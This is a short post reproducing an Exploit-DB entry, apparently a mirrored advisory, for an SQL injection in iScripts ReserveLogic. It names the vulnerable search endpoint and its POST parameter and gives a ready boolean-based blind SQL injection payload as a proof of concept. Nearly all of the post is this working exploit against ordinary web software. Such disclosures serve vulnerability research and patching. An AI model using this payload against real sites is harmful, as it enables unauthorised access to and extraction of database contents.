---
layout:     post
title:      "iScripts ReserveLogic - SQL Injection"
date:       2019-04-03 12:00
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: iScripts ReserveLogic - SQL Injection
# Date: 29.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.iscripts.com/reservelogic/
# Demo Site: https://www.demo.iscripts.com/reservelogic/demo/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC: SQLi -----

Request: http://localhost/[PATH]/search
Vulnerable Parameter: jqSearchDestination (POST)
Payload: jqSearchDestination=(SELECT (CASE WHEN (8124=8124) THEN 12345 ELSE
(SELECT 3029 UNION SELECT 1241) END))
